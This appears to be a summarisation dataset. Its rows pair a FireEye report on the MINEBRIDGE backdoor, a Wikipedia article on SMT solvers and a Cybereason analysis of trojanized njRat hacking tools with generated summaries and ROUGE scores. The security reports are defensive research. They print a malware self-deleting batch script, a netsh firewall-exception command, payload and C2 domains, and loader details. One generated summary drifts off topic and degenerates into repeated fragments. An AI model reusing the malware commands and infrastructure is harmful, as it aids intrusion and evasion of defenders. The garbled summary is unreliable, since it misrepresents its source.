the name of this sample (i.e., msi.dll). Relaunch the hosting TeamViewer application with command-line argument COM1_. Delete <sample_name>.old. restart_command Relaunch the hosting TeamViewer application with command-line argument COM1_. terminate_command Terminate the hosting TeamViewer application. kill_command Create and execute the self-deleting batch script tvdll.cmd to delete all unzipped files as well as the sample file. Terminate the hosting TeamViewer application. poweroff_command Shutdown the system. reboot_command Reboot the system. setinterval_command Update the C2 beacon-interval time.After executing all commands in the response, the sample sleeps for the designated C2 beacon-interval time. It repeats the process outlined above to send the next C2 beacon. This behavior repeats indefinitely.The self-deleting batch script tvdll.cmd contains the following content where <renamed_TeamVeiwer> is the renamed TeamViewer executable (i.e., wpvnetwks.exe) and <sample_name> is the name of this sample (i.e., msi.dll).@echo offping 1.1.1.1 -n 1 -w 5000 > nulgoto nosleep1:redel1ping 1.1.1.1 -n 1 -w 750 > nul:nosleep1attrib -a -h -s -r %~d0%~p0TeamViewer_Resource_en.dlldel /f /q %~d0%~p0TeamViewer_Resource_en.dllif exist ""%~d0%~p0TeamViewer_Resource_en.dll"" goto redel1goto nosleep2:redel2ping 1.1.1.1 -n 1 -w 750 > nul:nosleep2attrib -a -h -s -r %~d0%~p0TeamViewer_StaticRes.dlldel /f /q %~d0%~p0TeamViewer_StaticRes.dllif exist ""%~d0%~p0TeamViewer_StaticRes.dll"" goto redel2goto nosleep3:redel3ping 1.1.1.1 -n 1 -w 750 > nul:nosleep3attrib -a -h -s -r %~d0%~p0TeamViewer_Desktop.exedel /f /q %~d0%~p0TeamViewer_Desktop.exeif exist ""%~d0%~p0TeamViewer_Desktop.exe"" goto redel3goto nosleep4:redel4ping 1.1.1.1 -n 1 -w 750 > nul:nosleep4attrib -a -h -s -r %~d0%~p0TeamViewer.inidel /f /q %~d0%~p0TeamViewer.iniif exist ""%~d0%~p0TeamViewer.ini"" goto redel4goto nosleep5:redel5ping 1.1.1.1 -n 1 -w 750 > nul:nosleep5attrib -a -h -s -r %~d0%~p0<sample_name>del /f /q %~d0%~p0<sample_name>if exist ""%~d0%~p0<sample_name>"" goto redel5goto nosleep6:redel6ping 1.1.1.1 -n 1 -w 750 > nul:nosleep6attrib -a -h -s -r %~d0%~p0<renamed_TeamVeiwer>del /f /q %~d0%~p0<renamed_TeamVeiwer>if exist ""%~d0%~p0<renamed_TeamViewer>"" goto redel6attrib -a -h -s -r %0del /f /q %0Possible Connection to Another Intrusion SetThe identified MINEBRIDGE samples have been packed within a loader we call MINEDOOR. Since Fall 2019, we've observed a group publicly tracked as TA505 conducting phishing campaigns that use MINEDOOR to deliver the FRIENDSPEAK backdoor. The combination of MINEDOOR and FRIENDSPEAK has also been publicly discussed using the name Get2.The limited overlap in tactics, techniques, and procedures (TTPs) between campaigns delivering MINEBRIDGE and those delivering FRIENDSPEAK may suggest that MINEDOOR is not exclusive to TA505. Recent campaigns delivering FRIENDSPEAK have appeared to use spoofed sender addresses, Excel spreadsheets with embedded payloads, and campaign-specific domains that masquerade as common technology services. Meanwhile, the campaigns delivering MINEBRIDGE have used actor-controlled email addresses, malicious Word documents that download payloads from a remote server, and domains with a variety of themes sometimes registered weeks in advance of the campaign. The campaigns delivering MINEBRIDGE also appear to be significantly smaller in both volume and scope than the campaigns delivering FRIENDSPEAK. Finally, we observed campaigns delivering MINEBRIDGE on Eastern Orthodox Christmas when Russian-speaking actors are commonly inactive, we did not observe campaigns delivering FRIENDSPEAK during the week surrounding the holiday and language resources in the malware may suggest TA505 actors speak Russian.It is plausible that these campaigns represent a subset of TA505 activity. For example, they may be operations conducted on behalf of a specific client or by a specific member of the broader threat group. Both sets of campaigns used domains that were registered with Eranet and had the registrant location ""JL, US"" or ""Fujian, CN,"" however this overlap is less notable because we suspect that TA505 has used domains registered by a service that reuses registrant information.Post-compromise activity would likely reveal if these campaigns were conducted by TA505 or a second threat group, however, FireEye has not yet observed any instances in which a host has been successfully compromised by MINEBRIDGE. As such, FireEye currently clusters this activity separately from what the public tracks as TA505.AcknowledgmentsFireEye would like to thank all the dedicated authors of open source tooling and research referenced in this blog post. Further, FireEye would like to thank TeamViewer for their collaboration with us on this matter. The insecure DLL loading highlighted in this blog post was resolved in TeamViewer 11.0.214397, released on October 22, 2019, prior to the TeamViewer team receiving any information from FireEye. Additionally, TeamViewer is working to add further mitigations for the malware's functionality. FireEye will update this post with further data from TeamViewer when this becomes available.Indicators of Compromise (IOCs)Suspicious BehaviorsProcess lineage: Microsoft Word launching TeamViewerDirectory Creation: %APPDATA%\Windows Media PlayerFile Creation: %APPDATA%\Windows Media Player\msi.dll %APPDATA%\Windows Media Player\msi.dll.old %APPDATA%\Windows Media Player\tvdll.cmd %APPDATA%\Windows Media Player\wpvnetwks.exe %APPDATA%\Windows Media Player\TeamViewer_Resource_en.dll %APPDATA%\Windows Media Player\TeamViewer_StaticRes.dll %APPDATA%\Windows Media Player\TeamViewer_Desktop.exe %APPDATA%\Windows Media Player\TeamViewer.ini %CSIDL_STARTUP%\Windows WMI.lnk %CSIDL_PROFILE%\<dll_name>.xpdf %TEMP%\<32 random characters> %TEMP%\<32 random characters>.exe %TEMP%\~8426bcrtv7bdf.binNetwork Activity: HTTPS Post requests to C2 URLs User-Agent String: ""Mozilla/5.0 (iPhone, CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B150 Safari/604.1""C2 Domains123faster[.]topconversia91[.]topfatoftheland[.]topcreatorz123[.]topcompilator333[.]topDownload Domainsneurogon[.]comtiparcano[.]comseigortan[.]commarendoger[.]combadiconreg[.]comSender Domainspt-cpaaccountant[.]comrogervecpa[.]comagent4career[.]combestrecruitments[.]comPhishing DocumentsMD5 SHA256 01067c8e41dae72ce39b28d85bf923ee 80e48391ed32e6c1ca13079d900d3afad62e05c08bd6e929dffdd2e3b9f69299 1601137b84d9bebf21dcfb9ad1eaa69d 3f121c714f18dfb59074cbb665ff9e7f36b2b372cfe6d58a2a8fb1a34dd71952 1c883a997cbf2a656869f6e69ffbd027 de7c7a962e78ceeee0d8359197daeb2c3ca5484dc7cf0d8663fb32003068c655 2ed49bd499c9962e115a66665a6944f6 b8f64a83ad770add6919d243222c62471600e64789264d116c560b7c574669ec 3b948368fe1a296f5ed18b11194ce51c 999d4f434bbc5d355656cc2a05982d61d6770a4c3c837dd8ec6aff8437ae405a 4148281424ff3e85b215cd867746b20c 9812123d2367b952e68fa09bd3d1b3b3db81f0d3e2b3c03a53c21f12f1f4c889 54f22fbc84f4d060fcbf23534a02e5f6 7b20e7e4e0b1c0e41de72c75b1866866a8f61df5a8af0ebf6e8dbd8f4e7bdc57 5a3d8348f04345f6687552e6b7469ac1 77a33d9a4610c4b794a61c79c93e2be87886d27402968310d93988dfd32a2ccf 607d28ae6cf2adb87fcb7eac9f9e09ab f3917832c68ed3f877df4cd01635b1c14a9c7e217c93150bebf9302223f52065 9ba3275ac0e65b9cd4d5afa0adf401b4 18698c5a6ff96d21e7ca634a608f01a414ef6fbbd7c1b3bf0f2085c85374516e 9becd2fd73aa4b36ad9cd0c95297d40b 30025da34f6f311efe6b7b2c3fe334f934f3f6e6024e4d95e8c808c18eb6de03 9cce3c9516f0f15ce18f37d707931775 bf0adb30ca230eee6401861e1669b9cfeaa64122cc29c5294c2198f2d82f760e 9faf9e0c5945876c8bad3c121c91ea15 88c4019e66564ad8c15b189b903276910f9d828d5e180cac30f1f341647278fc a37e6eeb06729b6108649f21064b16ef e895dc605c6dcaf2c3173b5ec1a74a24390c4c274571d6e17b55955c9bd48799 ab8dc4ba75aad317abb8ee38c8928db0 212793a915bdd75bede8a744cd99123e2a5ac70825d7b2e1fc27104276a3aafd b8817253288b395cb33ffe36e0072dc9 ba013420bd2306ecb9be8901db905b4696d93b9674bd7b10b4d0ef6f52fbd069 cb5e5d29f844eb22fecaa45763750c27 4ff9bfde5b5d3614e6aa753cacc68d26c12601b88e61e03e4727ee6d9fe3cdc2 cffda37453e1a1389840ed6ebaef1b0d c9f6ba5368760bf384399c9fd6b4f33185e7d0b6ea258909d7516f41a0821056 dc0e1e4ec757a777a4d4cc92a8d9ef33 ac7e622e0d1d518f1b002d514c348a60f7a7e7885192e28626808a7b9228eab6 e5c7e82670372e3cf8e8cab2c1e6bc17 eba3c07155c47a47ee4d9b5201f47a9473255f4d7a6590b5c4e7b6e9fc533c08 f93062f6271f20649e61a09c501c6c92 3f4f546fba4f1e2ee4b32193abcaaa207efe8a767580ab92e546d75a7e978a0bMINEBRIDGE/MINEDOOR Samples";"FireEye has continued to observe multiple targeted phishing campaigns designed to download and deploy a backdoor we track as MINEBRIDGE. The campaigns primarily targeted financial services organizations in the United States, though targeting is likely more widespread than those we've initially observed in our FireEye product telemetry. At least one campaign targeted South Korean organizations, including a marketing agency.In these campaigns, the phishing documents appeared to be carefully crafted and leveraged some publiclydocumented but in our experience uncommon and misunderstood TTPs, likely in an effort to decrease detection of the malicious documents' macros. The actor also used a selfhosted email marketing solution across multiple campaigns. Notably, the payload delivered in these campaigns leveraged a packer previously affiliated with a commonlytracked threat actor, an overlap that we will explore later.This blog post will review the theme of these campaigns and their targets, the adversary's unique tradecraft, the MINEBRIDGE C++ backdoor, some potential attribution overlaps, and importantly the threat actor's love of rap music.Targeting and Lure DetailWhile we first identified MINEBRIDGE samples in December, we observed our first phishing campaigns relating to this activity in early January 2020. Email addresses used to send phishing messages were associated with domains that appear to have been registered specifically for this purpose within a few weeks of the activity and were thematically consistent with the content of the phishing messages.Additionally, the actor(s) responsible are likely using a selfhosted email marketing solution called Acelle. Acelle adds extended email headers to messages sent via the platform in the format of XAcelle<variable>. The messages observed across campaigns using these TTP The phishing documents themselves leverage numerous interesting TTPs including hiding macros from the Office GUI, and VBA stomping.VBA stomping is a colloquial term applied to the manipulation of Office documents where the source code of a macro is made to mismatch the pseudocode (hereto referred to as ""pcode"") of the document. In order to avoid duplicating research and wasting the reader's time, we will instead reference the impressive work of our predecessors and peers in the industry. As an introduction to the concept, we first recommend reading the tool release blog post for EvilClippy from Outflank. The security team at Walmart has also published incredible research on the methodology. Vesselin Bontchev provides a useful open source utility for dumping the pcode from an Office document in pcodedmp. This tool can be leveraged to inspect the pcode of a document separate from its VBA source. It was adopted by the wider open source analysis toolkit oletools in order to detect the presence of stomping via comparison of pcode mnemonics vs keyword extraction in VBA source.That is a whole lot of quality reading for those interested. For the sake of brevity, the most important result of VBA stomping as relevant to this blog post is the following:Static analysis tools focusing on VBA macro source extraction may be fooled into a benign assessment of a document bearing malicious pcode.When VBA source is removed, and a document is opened in a version of Office for which the pcode was not compiled to execute, a macro will not execute correctly, resulting in potential failed dynamic analysis.When a document is opened under a version of Office and the GUI is used to view the macro, the embedded pcode is decompiled to be viewed.The final two points identify some interesting comp The MINEBRIDGE infection chain begins with the malicious document. Upon successful execution of the malicious document, the ""uCWOncHvBb.dll"" file is created via a call to URLDownloadToFileA to the URL hxxps://marendoger[.]com/team/rumba.php. The ""uCWOncHvBb.dll"" file is then used to infect the system with the MINEBRIDGE malware. MINEBRIDGE is a 32bit C++ backdoor designed to be loaded by an older, unpatched instance of the legitimate remote desktop software TeamViewer by DLL loadorder hijacking. The backdoor hooks Windows APIs to prevent the victim from seeing the TeamViewer application. By default, MINEBRIDGE conducts command and control (C2) communication via HTTPS POST requests to hardcoded C2 domains. The POST requests contain a GUID derived from the system's volume serial number, a TeamViewer unique id and password, username, computer name, operating system version, and beacon interval. MINEBRIDGE can also communicate with a C2 server by sending TeamViewer chat messages using a custom window procedure hook. Collectively, the two C2 methods support commands for downloading and executing payloads, downloading arbitrary files, selfdeletion and updating, process listing, shutting down and rebooting the system, executing arbitrary shell commands, process elevation, turning on/off TeamViewer's microphone, and gathering system UAC information.MINEBRIDGE's default method of communication is sending HTTPS POST requests over TCP port 443. This method of communication is always active; however, the beaconinterval time may be changed via a command. Before sending any C2 beacons, the sample waits to collect the TeamViewer generated unique id (<tv_id>) and password (<tv_pass>) via SetWindowsTextW hooks.This specific sample continuously sends an HTTP POST request over TCP port 443 with the URI ~f83g7bfiunwjsd1/g4t3_indata.php to each host listed below until a response is received.123faster[.]topconversia91[.]topfatofth The ITSecurity report summarizes the security risks associated with the TeamViewer application. The TeamViewer application is susceptible to a variety of security risks, including unauthorized access, data theft, and malware infection. Additionally, the TeamViewer application is vulnerable to bruteforce attacks, password cracking, and session hijacking. ### Output: The ITSecurity report summarizes the security risks associated with the TeamViewer application. The TeamViewer application is susceptible to a variety of security risks, including unauthorized access, data theft, and malware infection. Additionally, the TeamViewer application is vulnerable to bruteforce attacks, password cracking, and session hijacking. No response. , the same. same. same. . . . . . ays. ays. : ays. ays. ays. ays. ays. ays. ays. ays. [ [ays. ays. ays. ays. ays. ays to the same. to . of the same of the same. .";en;{'r': 0.32819722650231126, 'p': 0.908315565031983, 'f': 0.482173170973206};{'r': 0.2650918635170604, 'p': 0.8590522478736331, 'f': 0.40515758951906644};{'r': 0.3274268104776579, 'p': 0.906183368869936, 'f': 0.4810413090603593}
https://en.wikipedia.org/wiki/Satisfiability_modulo_theories;Satisfiability modulo theories;"Logical problem studied in computer scienceIn computer science and mathematical logic, satisfiability modulo theories (SMT) is the problem of determining whether a mathematical formula is satisfiable. It generalizes the Boolean satisfiability problem (SAT) to more complex formulas involving real numbers, integers, and/or various data structures such as lists, arrays, bit vectors, and strings. The name is derived from the fact that these expressions are interpreted within (""modulo"") a certain formal theory in first-order logic with equality (often disallowing quantifiers). SMT solvers are tools which aim to solve the SMT problem for a practical subset of inputs. SMT solvers such as Z3 and cvc5 have been used as a building block for a wide range of applications across computer science, including in automated theorem proving, program analysis, program verification, and software testing.Since Boolean satisfiability is already NP-complete, the SMT problem is typically NP-hard, and for many theories it is undecidable. Researchers study which theories or subsets of theories lead to a decidable SMT problem and the computational complexity of decidable cases. The resulting decision procedures are often implemented directly in SMT solvers, see, for instance, the decidability of Presburger arithmetic. SMT can be thought of as a constraint satisfaction problem and thus a certain formalized approach to constraint programming.Basic terminology [ edit ]Formally speaking, an SMT instance is a formula in first-order logic, where some function and predicate symbols have additional interpretations, and SMT is the problem of determining whether such a formula is satisfiable. In other words, imagine an instance of the Boolean satisfiability problem (SAT) in which some of the binary variables are replaced by predicates over a suitable set of non-binary variables. A predicate is a binary-valued function of non-binary variables. Example predicates include linear inequalities (e.g., 3 x + 2 y ? z ? 4 {\displaystyle 3x+2y-z\geq 4} ) or equalities involving uninterpreted terms and function symbols (e.g., f ( f ( u , v ) , v ) = f ( u , v ) {\displaystyle f(f(u,v),v)=f(u,v)} where f {\displaystyle f} is some unspecified function of two arguments). These predicates are classified according to each respective theory assigned. For instance, linear inequalities over real variables are evaluated using the rules of the theory of linear real arithmetic, whereas predicates involving uninterpreted terms and function symbols are evaluated using the rules of the theory of uninterpreted functions with equality (sometimes referred to as the empty theory). Other theories include the theories of arrays and list structures (useful for modeling and verifying computer programs), and the theory of bit vectors (useful in modeling and verifying hardware designs). Subtheories are also possible: for example, difference logic is a sub-theory of linear arithmetic in which each inequality is restricted to have the form x ? y > c {\displaystyle x-y>c} for variables x {\displaystyle x} and y {\displaystyle y} and constant c {\displaystyle c} .Most SMT solvers support only quantifier-free fragments of their logics.Expressive power [ edit ]An SMT instance is a generalization of a Boolean SAT instance in which various sets of variables are replaced by predicates from a variety of underlying theories. SMT formulas provide a much richer modeling language than is possible with Boolean SAT formulas. For example, an SMT formula allows one to model the datapath operations of a microprocessor at the word rather than the bit level.By comparison, answer set programming is also based on predicates (more precisely, on atomic sentences created from atomic formula). Unlike SMT, answer-set programs do not have quantifiers, and cannot easily express constraints such as linear arithmetic or difference logic--ASP is at best suitable for Boolean problems that reduce to the free theory of uninterpreted functions. Implementing 32-bit integers as bitvectors in ASP suffers from most of the same problems that early SMT solvers faced: ""obvious"" identities such as x+y=y+x are difficult to deduce.Constraint logic programming does provide support for linear arithmetic constraints, but within a completely different theoretical framework.[citation needed] SMT solvers have also been extended to solve formulas in higher-order logic.[1]Solver approaches [ edit ]Early attempts for solving SMT instances involved translating them to Boolean SAT instances (e.g., a 32-bit integer variable would be encoded by 32 single-bit variables with appropriate weights and word-level operations such as 'plus' would be replaced by lower-level logic operations on the bits) and passing this formula to a Boolean SAT solver. This approach, which is referred to as the eager approach, has its merits: by pre-processing the SMT formula into an equivalent Boolean SAT formula existing Boolean SAT solvers can be used ""as-is"" and their performance and capacity improvements leveraged over time. On the other hand, the loss of the high-level semantics of the underlying theories means that the Boolean SAT solver has to work a lot harder than necessary to discover ""obvious"" facts (such as x + y = y + x {\displaystyle x+y=y+x} for integer addition.) This observation led to the development of a number of SMT solvers that tightly integrate the Boolean reasoning of a DPLL-style search with theory-specific solvers (T-solvers) that handle conjunctions (ANDs) of predicates from a given theory. This approach is referred to as the lazy approach.Dubbed DPLL(T),[2] this architecture gives the responsibility of Boolean reasoning to the DPLL-based SAT solver which, in turn, interacts with a solver for theory T through a well-defined interface. The theory solver only needs to worry about checking the feasibility of conjunctions of theory predicates passed on to it from the SAT solver as it explores the Boolean search space of the formula. For this integration to work well, however, the theory solver must be able to participate in propagation and conflict analysis, i.e., it must be able to infer new facts from already established facts, as well as to supply succinct explanations of infeasibility when theory conflicts arise. In other words, the theory solver must be incremental and backtrackable.SMT for undecidable theories [ edit ]Most of the common SMT approaches support decidable theories. However, many real-world systems, such as an aircraft and its behavior, can only be modelled by means of non-linear arithmetic over the real numbers involving transcendental functions. This fact motivates an extension of the SMT problem to non-linear theories, such as determining whether the following equation is satisfiable:( sin ? ( x ) 3 = cos ? ( log ? ( y ) ? x ) ? b ? ? x 2 ? 2.3 y ) ? ( ! b ? y < ? 34.4 ? exp ? ( x ) > y x ) {\displaystyle {\begin{array}{lr}&(\sin(x)^{3}=\cos(\log(y)\cdot x)\vee b\vee -x^{2}\geq 2.3y)\wedge \left(eg b\vee y<-34.4\vee \exp(x)>{y \over x}\right)\end{array}}}whereb ? B , x , y ? R . {\displaystyle b\in {\mathbb {B} },x,y\in {\mathbb {R} }.}Such problems are, however, undecidable in general. (On the other hand, the theory of real closed fields, and thus the full first order theory of the real numbers, are decidable using quantifier elimination. This is due to Alfred Tarski.) The first order theory of the natural numbers with addition (but not multiplication), called Presburger arithmetic, is also decidable. Since multiplication by constants can be implemented as nested additions, the arithmetic in many computer programs can be expressed using Presburger arithmetic, resulting in decidable formulas.Examples of SMT solvers addressing Boolean combinations of theory atoms from undecidable arithmetic theories over the reals are ABsolver,[3] which employs a classical DPLL(T) architecture with a non-linear optimization packet as (necessarily incomplete) subordinate theory solver, and iSAT, building on a unification of DPLL SAT-solving and interval constraint propagation called the iSAT algorithm.[4]Solvers [ edit ]The table below summarizes some of the features of the many available SMT solvers. The column ""SMT-LIB"" indicates compatibility with the SMT-LIB language, many systems marked 'yes' may support only older versions of SMT-LIB, or offer only partial support for the language. The column ""CVC"" indicates support for the CVC language. The column ""DIMACS"" indicates support for the DIMACS format.Projects differ not only in features and performance, but also in the viability of the surrounding community, its ongoing interest in a project, and its ability to contribute documentation, fixes, tests and enhancements.Standardization and the SMT-COMP solver competition [ edit ]There are multiple attempts to describe a standardized interface to SMT solvers (and automated theorem provers, a term often used synonymously). The most prominent is the SMT-LIB standard,[citation needed] which provides a language based on S-expressions. Other standardized formats commonly supported are the DIMACS format[citation needed] supported by many Boolean SAT solvers, and the CVC format[citation needed] used by the CVC automated theorem prover.The SMT-LIB format also comes with a number of standardized benchmarks and has enabled a yearly competition between SMT solvers called SMT-COMP. Initially, the competition took place during the Computer Aided Verification conference (CAV),[5][6] but as of 2020 the competition is hosted as part of the SMT Workshop, which is affiliated with the International Joint Conference on Automated Reasoning (IJCAR).[7]Applications [ edit ]SMT solvers are useful both for verification, proving the correctness of programs, software testing based on symbolic execution, and for synthesis, generating program fragments by searching over the space of possible programs. Outside of software verification, SMT solvers have also been used for type inference[8][9] and for modelling theoretic scenarios, including modelling actor beliefs in nuclear arms control.[10]Verification [ edit ]Computer-aided verification of computer programs often uses SMT solvers. A common technique is to translate preconditions, postconditions, loop conditions, and assertions into SMT formulas in order to determine if all properties can hold.There are many verifiers built on top of the Z3 SMT solver. Boogie is an intermediate verification language that uses Z3 to automatically check simple imperative programs. The VCC verifier for concurrent C uses Boogie, as well as Dafny for imperative object-based programs, Chalice for concurrent programs, and Spec for C. F* is a dependently typed language that uses Z3 to find proofs, the compiler carries these proofs through to produce proof-carrying bytecode. The Viper verification infrastructure encodes verification conditions to Z3. The sbv library provides SMT-based verification of Haskell programs, and lets the user choose among a number of solvers such as Z3, ABC, Boolector, cvc5, MathSAT and Yices.There are also many verifiers built on top of the Alt-Ergo SMT solver. Here is a list of mature applications:Why3, a platform for deductive program verification, uses Alt-Ergo as its main prover,CAVEAT, a C-verifier developed by CEA and used by Airbus, Alt-Ergo was included in the qualification DO-178C of one of its recent aircraft,Frama-C, a framework to analyse C-code, uses Alt-Ergo in the Jessie and WP plugins (dedicated to ""deductive program verification""),SPARK uses CVC4 and Alt-Ergo (behind GNATprove) to automate the verification of some assertions in SPARK 2014,Atelier-B can use Alt-Ergo instead of its main prover (increasing success from 84% to 98% on the ANR Bware project benchmarks),Rodin, a B-method framework developed by Systerel, can use Alt-Ergo as a back-end,Cubicle, an open source model checker for verifying safety properties of array-based transition systems.EasyCrypt, a toolset for reasoning about relational properties of probabilistic computations with adversarial code.Many SMT solvers implement a common interface format called SMTLIB2 (such files usually have the extension "" .smt2 ""). The LiquidHaskell tool implements a refinement type based verifier for Haskell that can use any SMTLIB2 compliant solver, e.g. cvc5, MathSat, or Z3.Symbolic-execution based analysis and testing [ edit ]An important application of SMT solvers is symbolic execution for analysis and testing of programs (e.g., concolic testing), aimed particularly at finding security vulnerabilities.[citation needed] Example tools in this category include SAGE from Microsoft Research, KLEE, S2E, and Triton. SMT solvers that have been used for symbolic-execution applications include Z3, STP Archived 2015-04-06 at the Wayback Machine, the Z3str family of solvers, and Boolector.[citation needed]See also [ edit ]Notes [ edit ]References [ edit ]This article is adapted from a column in the ACM SIGDA e-newsletter by Prof. Karem Sakallah. Original text is available here";The SMTLIB standard provides a language based on Sexpressions. Other standardized formats commonly supported are the DIMACS format supported by many Boolean SAT solvers, and the CVC format used by the CVC automated theorem prover. The SMTLIB format also comes with a number of standardized benchmarks and has enabled a yearly competition between SMT solvers called SMTCOMP. Initially, the competition took place during the Computer Aided Verification conference (CAV), but as of 2020 the competition is hosted as part of the SMT Workshop, which is affiliated with the International Joint Conference on Automated Reasoning (IJCAR).;en;{'r': 0.07673568818514007, 'p': 0.9264705882352942, 'f': 0.14173228205177393};{'r': 0.04640095181439619, 'p': 0.8571428571428571, 'f': 0.0880361164071473};{'r': 0.07673568818514007, 'p': 0.9264705882352942, 'f': 0.14173228205177393}
https://www.cybereason.com/blog/research/whos-hacking-the-hackers-no-honor-among-thieves;Who's Hacking the Hackers: No Honor Among Thieves;"Research by: Amit SerperIntroductionCybereason Nocturnus is investigating a campaign where attackers are trojanizing multiple hacking tools with njRat, a well known RAT. The campaign ultimately gives attackers total access to the target machine. The threat actors behind this campaign are posting malware embedded inside various hacking tools and cracks for those tools on several websites. Once the files are downloaded and opened, the attackers are able to completely take over the victim's machine. In this write-up we present our analysis of the TTPs of the attackers and the indicators of compromise. In the investigation of this campaign, we have found hundreds of trojanized files and a lot of information about the threat actors infrastructure.Learn more about what trends we expect to see this year in our 2020 security predictions report.Key PointsWidespread Campaign: We have found a widespread hacking campaign that uses the njRat trojan to hijack the victim's machine, giving the threat actors complete access that can be used for anything from conducting DDoS attacks to stealing sensitive data.We have found a widespread hacking campaign that uses the njRat trojan to hijack the victim's machine, giving the threat actors complete access that can be used for anything from conducting DDoS attacks to stealing sensitive data. Baiting Hackers: The malware is spreading by turning various hacking tools and other installers into trojans. The threat actors are posting the maliciously modified files on various forums and websites to bait other hackers.The malware is spreading by turning various hacking tools and other installers into trojans. The threat actors are posting the maliciously modified files on various forums and websites to bait other hackers. Using Vulnerable WordPress Websites: The threat actors are hacking vulnerable WordPress installations to host their malicious njRat payloads.The threat actors are hacking vulnerable WordPress installations to host their malicious njRat payloads. A ""Malware Factory"": It seems as if the threat actors behind this campaign are building new iterations of their hacking tools on a daily basis.It seems as if the threat actors behind this campaign are building new iterations of their hacking tools on a daily basis.table of contentsMalware analysisWhile reviewing some detection data last week, we stumbled on a new detection of njRat in one of the environments we are monitoring. njRat is popular in the Middle East and gives its operators the ability to hijack the victim's machine for keylogging, taking screenshots, file manipulation and exfiltration, webcam and microphone recording.While njRat is a fairly prevalent threat and popular RAT , this particular infection caught our eye.Initial detection of the njRat in the Cybereason Defense Platform.The process appears to be masquerading as a legitimate Windows application (explorer.exe). However, when checking its hash on VirusTotal, the sample seems to be very new, just a few hours old at the time. In the affected environment, it looks as if the njRat is contacting two IP addresses: one of them was unknown to us at the time (capeturk.com - more on that later) and the other, (anandpen.com) a compromised website of an Indian office supplies manufacturer.Hostname IP capeturk.com 104.206.239.81 www.anandpen.com 209.99.16.94IP addresses and hostnames contacted by the malware.anandpen.com is a hacked WordPress website that serves malware from one of its internal WordPress directories. This is a common practice by attackers who are exploiting vulnerable WordPress installations. In this case, one of the payloads was served through the /wp-includes/images/media/1/explorer.zip path on the anandpen.com domain.After running a few YARA queries and searching for all of the samples on VT associated with the two aforementioned IP addresses, we found dozens of different samples of the same njRat hosted on the same server. Each sample had a different creation time, but they were all hosted on the same server and actively targeting victims.As mentioned before, all of the observed samples (including the detection on one of the environments we are monitoring) had the name of a legitimate Windows process, like svchost.exe or explorer.exe, yet all of them were executed from subdirectories inside %AppData%. Clearly, some mischief was taking place, but the root cause for these executions was unknown since the files were dropped in the environment prior to the deployment of our product.Finding the Root CauseWhen investigating the Malop, it's clear the malicious explorer.exe process is communicating with the hostname 7777.elitfilmizle[.]com.The information fields in the unsigned PE file have an interesting peculiarity to them:Highlighted are the company name and product name of the file, as seen in the Cybereason Defense Platform.Further inspection of the file version information reveals more mismatches:Additional information about file hash d5f53d26615772ff3ca84d88604f2ddf.For comparison, here's the product information field for a legitimate signed explorer.exe from a Windows 10 Pro build 1903:Legitimate explorer.exe hash: 4E196CEA0C9C46A7D656C67E52E8C7C7.While the file name is explorer.exe, the company name is ""Intel Corporation"" and the product name is ""Intel(R) Common Users Interface"", which certainly doesn't make much sense.Some more hints (notice the date) are in the PDB path for said file:There are a few interesting details in this PDB path:""03-02-2020"" - this date implies there are multiple different variants of the same project (past/future versions.Upon further investigation, I found many of these variants. ""TripleDES-Rijn-GZIPP"" - this refers to methods the loader of the malware uses to masquerade it's true purpose (more on that later)When examining explorer.exe, it's clear that it is actually a .NET PE executable:Upon closer inspection, this file was originally written in Visual Basic, which is typical for njRat loaders:Some of the crypter functionality is available once the executable is decompiled (note that the decomplication is to C for legibility):The three red arrows in the screenshot are directly related to the string I mentioned before, which appeared in the PDB (""TripleDES-Rijn-GZIPP""). The arrows point to the method of encryption and compression (one can say obfuscation) of the file: TripleDES followed by AES (Rijndael) and then GZIP compression. The blue arrows point to the key used for both the TripleDES and AES encryption, which is ""abc123456"".Once the loader unpacks the payload, it deletes the original loader file and continues to run its course. The malware will create a new directory, %USER%\AppData\Roaming\Intel Corporation\Intel(R) Common User Interface\8.1.1.7800\ and use it as a staging directory. The njRat loader continues to drop files into that staging directory, eventually dropping the main njRat payload with a random name. The malware changes the random file name to explorer.exe, copies it to %AppData%\roaming, and executes it from there. After it executes, the fake explorer.exe (the njRat payload) runs a netsh command to communicate to the outside world. It alters the Windows Firewall with the following command:netsh firewall add allowedprogram 'C:\Users\user\AppData\Roaming\explorer.exe' 'explorer.exe'njRat contacts several servers to receive commands and files from its operators:Capeturk.com - a repository for a newer version of njRat used in this campaignBlog.capeturk.com - the C2 for njRatAnandpen.com - the repository for various njRat versions and other tools used by the attackersNote: anandpen.com was hacked by the attackers. It is a WordPress-powered website of a pen manufacturing company from India. We have reached out to the company and informed them about the incident, but we have yet to receive a response.Threat IntelNow that we understand how this njRat campaign operates and which servers it's connecting to, there is one question that remains: how do people get infected?After examining the environment, it's clear there were many hacking and penetration tools deployed in various paths on the target machine. By examining the hashes on the network, we could see that all of the hacking tools had various cracks deployed alongside them. Both the tools and the cracks were all infected with this njRat campaign.By correlating the identified servers with the hashes found on VT using VTGraph, we can see there are plenty of samples related to this campaign:VTGraph correlating between samples and servers.At this point, we know there is a campaign targeting hackers by trojanizing various hacking tools. The one question that remains is, ""where are all of these trojanized tools coming from?""One of the files on the system was a keygen for an SQLi Dumper. SQLi Dumper is a tool used to perform all kinds of SQL injections and data dumps.One of the infected keygens for the program SQLi dumper v8.2.As we can see in the screenshot below, the keygen is credited to [RTN]. RTN is a group that writes cracks to various programs. They have a website and a forum:Screenshot from RTN's website.Important note: RTN's forum was inaccessible as of writing this report - we cannot determine if the trojanized files have anything to do with the original creators of the keygens made by RTN. However, the mediafire file hosting website contains the trojanized file and many other cracked versions of tools:Trojanized files in MediaFire file share.When looking for the page that leads to this file share, a blog hosted on Blogspot was found which offers many cracked hacking and the aforementioned trojanized tools, linking to the above mentioned MediaFire file share:As mentioned above, this campaign appears to have been going on for several years. So far, we have found samples that are either pretending to be various hacking tools or pretending to be installers of the Chrome Internet browser. There are around 700 samples associated with the *.capeturk.com subdomain, and there are more samples added to various threat intelligence resources on a daily basis.PDB ArtifactsAs described in the malware analysis section of this writeup, it appears that the PDB path embedded in the malware samples contains valuable information on how the malware is packed, as can be seen in the following examples. Each example is taken from a different sample:C:\Users\pc\Desktop\25-8-2019\3 lop-GZip+poly Xor base64\GZip+poly Xor base64 builder\WindowsApplication2\obj\Release\WindowsApplication2.pdb C:\Users\pc\Downloads\Gen code PolyRSM RC4 Poly AES Gzip Builder 21-09-2018\PolyRSM RC4 Poly AES Gzip 26-07-2018\PolyRSM 